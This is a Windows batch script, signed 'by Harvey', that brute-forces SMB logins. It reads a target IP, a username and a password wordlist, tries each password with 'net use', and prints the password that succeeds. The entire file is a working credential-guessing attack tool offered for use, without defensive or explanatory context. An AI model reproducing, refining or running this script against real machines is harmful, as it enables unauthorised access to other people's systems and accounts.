@echo off
title SMB BruteForce - by Harvey
color a
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "


set /a count=0
for /f %%a in (%wordlist%) do (
	echo %%a
	set pass=%%a
	call :attempt
)
echo Password not Found :(
pause
exit

:success
echo Password Found!: %pass%
echo.
net use \\%ip% /y
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
